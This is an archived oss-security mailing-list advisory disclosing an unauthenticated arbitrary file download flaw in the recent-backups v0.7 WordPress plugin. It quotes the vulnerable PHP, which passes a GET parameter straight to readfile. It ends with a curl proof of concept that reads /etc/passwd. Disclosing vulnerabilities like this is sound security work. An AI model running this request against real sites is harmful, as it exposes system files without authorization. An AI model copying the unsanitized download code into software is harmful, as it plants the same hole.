X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1417" "Tuesday" "14" "July" "2015" "17:25:57" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<CF6A69EE-3BF8-4F5D-8C41-C6FB7105D80A@me.com>" "37" "[oss-security] Remote file download vulnerability in recent-backups v0.7 wordpress plugin" nil nil nil "7" "2015071421:25:57" "[oss-security] Remote file download vulnerability in recent-backups v0.7 wordpress plugin" (number mark "        larry0@me.co Jul 14   37/1417  " thread-indent "\"[oss-security] Remote file download vulnerability in recent-backups v0.7 wordpress plugin\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 10199 invoked by uid 550); 14 Jul 2015 21:26:20 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 10148 invoked from network); 14 Jul 2015 21:26:14 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-07-14_10:2015-07-14,2015-07-14,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1507140309
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <CF6A69EE-3BF8-4F5D-8C41-C6FB7105D80A@me.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Date: Tue, 14 Jul 2015 17:25:57 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Remote file download vulnerability in recent-backups v0.7 wordpress
 plugin
To: Open Source Security <oss-security@lists.openwall.com>

Title: Remote file download vulnerability in recent-backups v0.7 wordpress =
plugin
Author: Larry W. Cashdollar, @_larry0
Date: 2015-07-13
Download Site: https://wordpress.org/plugins/recent-backups
Vendor: https://profiles.wordpress.org/andycheeseman/
Vendor Notified: 2015-07-13
Vendor Contact: plugins@wordpress.org
Description: To be used with the BackupWordPress plugin to list the content=
s of the backup directory in a dashboard widget.
Vulnerability:
The code in  download-file.php doesn't verify the user is logged in or sani=
tize what files can be downloaded.  This vulnerability can be used
to download sensitive system files:

     2	$file =3D $_GET['file_link'];
     3=09
     4	if (file_exists($file)) {
     5	    header('Content-Description: File Transfer');
     6	    header('Content-Type: application/octet-stream');
     7	    header('Content-Disposition: attachment; filename=3D'.basename($=
file));
     8	    header('Content-Transfer-Encoding: binary');
     9	    header('Expires: 0');
    10	    header('Cache-Control: must-revalidate, post-check=3D0, pre-chec=
k=3D0');
    11	    header('Pragma: public');
    12	    header('Content-Length: ' . filesize($file));
    13	    ob_clean();
    14	    flush();
    15	    readfile($file);

CVEID:
OSVDB:
Exploit Code:
	=E2=80=A2 $ curl -v "http://www.example.com/wp-content/plugins/recent-back=
ups/download-file.php?file_link=3D/etc/passwd=
